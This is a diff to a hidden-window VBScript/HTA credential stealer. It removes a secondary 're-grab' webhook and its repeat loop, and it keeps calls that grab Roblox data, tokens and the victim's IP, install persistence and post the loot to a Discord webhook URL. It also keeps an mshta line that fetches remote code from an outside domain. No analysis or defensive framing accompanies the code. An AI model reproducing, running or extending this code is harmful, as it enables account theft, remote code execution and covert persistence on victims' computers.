@@ -5,13 +5,12 @@
 window.resizeTo 0,0:window.moveTo -2000,-2000
 On Error Resume Next
 
-Dim sh, fso, WH_ALL, WH_REGRAB, PAYLOAD_URL, PC, USER
+Dim sh, fso, WH_ALL, PAYLOAD_URL, PC, USER
 Set sh = CreateObject("WScript.Shell")
 Set fso = CreateObject("Scripting.FileSystemObject")
 
-' --- WEBHOOKS & PAYLOAD URL ---
+' --- WEBHOOK & PAYLOAD URL ---
 WH_ALL = "https://discord.com/api/webhooks/1570948488827768965/iy7doGW9BXfi_b5dBRZlZ-CQNNBtKu72De2bXYFPRo32-Kj97nK8YzOy5SZMv2e8-Uqa"
-WH_REGRAB = "https://discord.com/api/webhooks/1570948618209329283/PzkNhyMFSipBVaU6MLG5cMr3bQrJCQhGVAqmKuBiWhekJTWAXERsrHl7Y0VUmU1scadn"
 
 PAYLOAD_URL = "mshta https://dicerigx.app/"
 
@@ -24,17 +23,7 @@ Call GrabRoblox(True)
 Call GrabTokens(True)
 Call Persistence(True)
 
-' --- Re-run grab chain 4x (every 5 min) (Re-Grab only) ---
-Dim runCount
-For runCount = 1 To 4
-    Call PostEmbedTo(":repeat: Re-grab " & runCount & "/4", "PC: " & PC & " | User: " & USER, 3447003, WH_REGRAB)
-    Call IP(False)
-    Call GrabRoblox(False)
-    Call GrabTokens(False)
-    If runCount < 4 Then Call SleepMinutes(5)
-Next
-
-' --- KILL SELF (Changed to 10 seconds) ---
+' --- WAIT AND CLOSE ---
 Call SleepSeconds(10)
 window.close()
 
@@ -169,10 +158,6 @@ Sub SleepSeconds(s)
     End If
 End Sub
 
-Sub SleepMinutes(m)
-    Call SleepSeconds(m * 60)
-End Sub
-
 ' --- Persistence ---
 Sub Persistence(isFirstGrab)
     On Error Resume Next
@@ -241,16 +226,12 @@ End Function
 Sub RouteMessage(t, d, c, isFirstGrab)
     If isFirstGrab Then
         Call PostEmbedTo(t, d, c, WH_ALL)
-    Else
-        Call PostEmbedTo(t, d, c, WH_REGRAB)
     End If
 End Sub
 
 Sub RouteFile(fn, ct, isFirstGrab)
     If isFirstGrab Then
         Call PostFileTo(fn, ct, WH_ALL)
-    Else
-        Call PostFileTo(fn, ct, WH_REGRAB)
     End If
 End Sub
 
